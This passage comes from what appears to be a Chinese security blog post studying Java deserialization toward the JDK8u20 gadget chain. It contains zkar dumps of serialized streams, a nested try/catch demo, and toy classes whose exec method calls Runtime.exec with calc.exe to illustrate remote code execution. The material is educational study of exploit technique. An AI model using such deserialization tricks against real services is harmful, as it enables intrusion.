<span class="hljs-number">61</span> <span class="hljs-number">70</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">362498820763181265</span> - <span class="hljs-number">0x05</span> <span class="hljs-number">07</span> da c1 c3 <span class="hljs-number">16</span> <span class="hljs-number">60</span> d1<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="hljs-number">0x03</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">2</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">02</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Float - F - <span class="hljs-number">0x46</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> 0a<br>            <span class="hljs-meta">@Value</span> - loadFactor - <span class="hljs-number">0x6c</span> <span class="hljs-number">6f</span> <span class="hljs-number">61</span> <span class="hljs-number">64</span> <span class="hljs-number">46</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">74</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span><br>        Index <span class="hljs-number">1</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">9</span> - <span class="hljs-number">0x00</span> 09<br>            <span class="hljs-meta">@Value</span> - threshold - <span class="hljs-number">0x74</span> <span class="hljs-number">68</span> <span class="hljs-number">72</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> 6c <span class="hljs-number">64</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - java.util.HashMap<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">loadFactor</span><br>            <span class="hljs-params">(<span class="hljs-type">float</span>)</span><span class="hljs-number">0.75</span> - <span class="hljs-number">0x3f</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>          threshold<br>            (integer)<span class="hljs-number">12</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0c<br>        <span class="hljs-meta">@ObjectAnnotation</span><br>          TC_BLOCKDATA - <span class="hljs-number">0x77</span><br>            <span class="hljs-meta">@Blockdata</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">10</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span><br>          TC_OBJECT - <span class="hljs-number">0x73</span><br>            TC_CLASSDESC - <span class="hljs-number">0x72</span><br>              <span class="hljs-meta">@ClassName</span><br>                <span class="hljs-meta">@Length</span> - <span class="hljs-number">26</span> - <span class="hljs-number">0x00</span> 1a<br>                <span class="hljs-meta">@Value</span> - ysoserial.practice.Student - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e <span class="hljs-number">70</span> <span class="hljs-number">72</span> <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> 2e <span class="hljs-number">53</span> <span class="hljs-number">74</span> <span class="hljs-number">75</span> <span class="hljs-number">64</span> <span class="hljs-number">65</span> 6e <span class="hljs-number">74</span><br>              <span class="hljs-meta">@SerialVersionUID</span> - -<span class="hljs-number">4051343464870626991</span> - <span class="hljs-number">0xc7</span> c6 bc <span class="hljs-number">95</span> <span class="hljs-number">69</span> <span class="hljs-number">49</span> <span class="hljs-number">39</span> <span class="hljs-number">51</span><br>              <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257538</span><br>              <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>              <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>              []Fields<br>                Index <span class="hljs-number">0</span>:<br>              <span class="hljs-meta">@ClassName</span> - ysoserial.practice.Student<br>                &#123;&#125;Attributes<br>                  Name<br>                    TC_STRING - <span class="hljs-number">0x74</span><br>                      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257541</span><br>                      <span class="hljs-meta">@Length</span> - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>                      <span class="hljs-meta">@Value</span> - bridge - <span class="hljs-number">0x62</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">64</span> <span class="hljs-number">67</span> <span class="hljs-number">65</span><br>          TC_REFERENCE - <span class="hljs-number">0x71</span><br>            <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257540</span> - <span class="hljs-number">0x00</span> 7e <span class="hljs-number">00</span> <span class="hljs-number">04</span><br>          TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br><br></code></pre></td></tr></table></figure><p>可以看到在第二个Student（也就是value）用Handler指向了8257540，也就是第一个Student</p><h2 id="多重trycatch"><a href="#多重trycatch" class="headerlink" title="多重trycatch"></a>多重trycatch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TryCatch</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryCatch</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> / <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> / <span class="hljs-number">0</span>;<br>                System.out.println(<span class="hljs-string">&quot;Inner End&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                System.out.println(<span class="hljs-string">&quot;Inner Error&quot;</span>);<br>                <span class="hljs-comment">//因为这里没有throws Exception，所以程序不会停止运行</span><br>            &#125;<br>            System.out.println(<span class="hljs-string">&quot;Outer End&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Outer Error&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        tryCatch();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Inner</span> <span class="hljs-variable">Error</span><br><span class="hljs-built_in">Outer</span> <span class="hljs-built_in">End</span><br></code></pre></td></tr></table></figure><p>可以看出，多层try catch的内层代码抛出异常时，内层代码会中断，但是外层代码会继续执行下去。</p><h1 id="JDK8u20分析"><a href="#JDK8u20分析" class="headerlink" title="JDK8u20分析"></a>JDK8u20分析</h1><h2 id="先用一个case来分析"><a href="#先用一个case来分析" class="headerlink" title="先用一个case来分析"></a>先用一个case来分析</h2><h3 id="zero为零抛出异常"><a href="#zero为零抛出异常" class="headerlink" title="zero为零抛出异常"></a>zero为零抛出异常</h3><p>假设存在两个类<code>AnnotationInvocationHandler</code>和<code>BeanContextSupport</code>，具体内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler.java<br><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">10L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> zero;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AnnotationInvocationHandler</span><span class="hljs-params">(<span class="hljs-type">int</span> zero)</span> &#123;<br>        <span class="hljs-built_in">this</span>.zero = zero;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        input.defaultReadObject();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.zero==<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-type">double</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>/<span class="hljs-built_in">this</span>.zero;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;Hack !!!&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(<span class="hljs-string">&quot;your number is error!!!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanContextSupport.java<br><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanContextSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">20L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        input.defaultReadObject();<br>        <span class="hljs-keyword">try</span> &#123;<br>            input.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>当传入<code>AnnotationInvocationHandler</code>方法中的<code>zero</code>等于<code>0</code>的时候，如何能在序列化结束时调用<code>AnnotationInvocationHandler.exec()</code>方法达到<code>RCE</code>？</strong></p><p>那么直接领zero&#x3D;0</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        AnnotationInvocationHandler handler=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationInvocationHandler</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;payload1.ser&quot;</span>));<br>        out.writeObject(handler);<br>        out.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;payload1.ser&quot;</span>));<br>        AnnotationInvocationHandler str=(AnnotationInvocationHandler)in.readObject();<br>        str.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>因为分母为零所以抛出了异常</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414230044740.png" alt="image-20230414230044740"> </p><p>使用zkar分析产生的payload1</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415153240075.png" alt="image-20230415153240075"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\payload1&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">45</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">2d</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.AnnotationInvocationHandler - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">41</span> 6e 6e <span class="hljs-number">6f</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">49</span> 6e <span class="hljs-number">76</span> <span class="hljs-number">6f</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">48</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0a<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-meta">@Value</span> - zero - <span class="hljs-number">0x7a</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br>PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\payload1.ser&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure><p>利用上面我们学到的知识，可以逐一分析反序列化协议构造流</p><p><code>STREAM_MAGIC - 0xac ed</code>是魔数，代表了序列化的格式；</p><p><code>STREAM_VERSION - 0x00 05</code>表示序列化的版本；</p><p><code>Contents</code>表示最终生成的序列的内容；</p><p><code>TC_OBJECT - 0x73</code>表示序列化一个新对象的开始标记；</p><p><code>TC_CLASSDESC - 0x72</code>表示一个新类的描述信息开始标记；</p><p><code>className</code>表示当前对象的类全名信息，下面紧跟着的内容也是<code>className</code>的描述信息；</p><p><code>Length - 45 - 0x00 2d</code>表示当前对象的类的长度为<code>45</code>；</p><p><code>Value - ysoserial.jdk8u20.AnnotationInvocationHandler - 0x79 73 6f 73 65 72 69 61 6c 2e 6a 64 6b 38 75 32 30 2e 41 6e 6e 6f 74 61 74 69 6f 6e 49 6e 76 6f 63 61 74 69 6f 6e 48 61 6e 64 6c 65 72</code>表示当前对象的类的名称为<code>ysoserial.jdk8u20.AnnotationInvocationHandler</code>，后面的字符串是其十六进制表示；</p><p><code>serialVersionUID - 0x00 00 00 00 00 00 00 0a</code>定义了<code>serialVersionUID</code>的值为<code>20</code>；</p><p><code>Handler - 8257536</code> 表示为对象分配一个值为<code>007e0000</code>的<code>handle</code>（因为引用<code>Handle</code>会从<code>0x7E0000</code>开始进行顺序赋值并且自动自增,而8257536正好就是0x7E0000），值得注意的是这里的<code>handle</code>实际上没有被真正的写入文件，如果我们把这里的<code>007e0000</code>加入到序列化数据中，会发生异常，从而终止反序列化进程，之所以会在这里显示出来，是因为<code>serializationDumper</code>的作者为了方便使用者分析序列化数据的结构；</p><p><code>classDescFlags - 0x02 - SC_SERIALIZABLE</code>表示类描述信息标记为<code>SC_SERIALIZABLE</code>，代表在序列化的时候使用的是<code>java.io.Serializable</code>（如果使用的是<code>java.io.Externalizable</code>，这里的标记就会变成<code>classDescFlags - 0x04 - SC_EXTERNALIZABLE</code>）；</p><p><code>fieldCount - 1 - 0x00 01</code>表示成员属性的数量为1，值得注意的是这里的<code>fieldCount</code>同样是<code>serializationDumper</code>的作者为了方便使用者分析序列化数据的结构而新设置的描述符，在官方序列化规范中是没有<code>fieldCount</code>的；</p><p><code>Fields</code>表示接下来的内容是类中所有字段的描述信息，<code>Fields</code>成员属性保存了当前分析的类对应的所有成员属性的元数据信息，它是一个数组结构，每一个元素都对应了成员属性的元数据描述信息，且不会重复；</p><p><code>0</code>表示接下来的内容是第一个字段的描述信息；</p><p><code>Int - I - 0x49</code>表示该字段的类型是<code>int</code>型；</p><p><code>fieldName</code>表示当前字段的字段名信息，下面紧跟着的内容也是<code> fieldName</code>的描述信息；</p><p><code>Length - 4 - 0x00 04</code>表示当前字段名的长度为<code>4</code>；</p><p><code>Value - zero - 0x7a65726f</code>表示当前字段名为<code>zero</code>；</p><p><code>classAnnotations</code>表示和类相关的<code>Annotation</code>的描述信息，这里的数据值一般是由<code>ObjectOutputStream</code>的<code>annotateClass()</code>方法写入的，但由于<code>annotateClass()</code>方法默认为空，所以<code>classAnnotations</code>后一般会设置<code>TC_ENDBLOCKDATA</code>标识；（关于<code>annotateClass</code>具体可以看我写的<a href="https://www.cnpanda.net/sec/893.html">序列化流程分析总结</a>一文）</p><p><code>TC_ENDBLOCKDATA - 0x78</code>数据块的结束标记，表示这个对象类型的描述符已经结束了；</p><p><code>superClassDesc</code>表示父类的描述符信息，这里为空；</p><p><code>TC_NULL - 0x70</code>表示当前对象是一个空引用；</p><p><code>newHandle 0x00 7e 00 01</code>表示为对象分配一个值为<code>007e0001</code>的<code>handle</code>，同上面的<code>newHandle</code>一样，这里的<code>handle</code>实际上没有被真正的写入文件；</p><p><code>classdata</code>表示下面紧跟着的是类数据中的所有内容；</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-keyword">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          zero<br>            (integer)<span class="hljs-number">0</span> - <span class="hljs-number">0</span>x00 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-comment">//这里表示zero的值为1</span><br></code></pre></td></tr></table></figure><p>以上就是所有的序列化数据的结构，当进行反序列化的时候，会依次从上到下读取序列化内容进行还原数据。</p><p><strong>如果在序列化的时候插入一段源码中没有的数据，在反序列化时会发生什么</strong></p><h3 id="双重writeObject"><a href="#双重writeObject" class="headerlink" title="双重writeObject"></a>双重writeObject</h3><p>首先先分析将同一段代码一次序列化和两次序列化以后他们之间的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DoubleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID=<span class="hljs-number">100L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream input)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        input.defaultReadObject();<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">DoubleSerialize</span> <span class="hljs-variable">doubleSerialize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DoubleSerialize</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;double1.ser&quot;</span>));<br>        oos.writeObject(doubleSerialize);<br>        oos.close();<br>    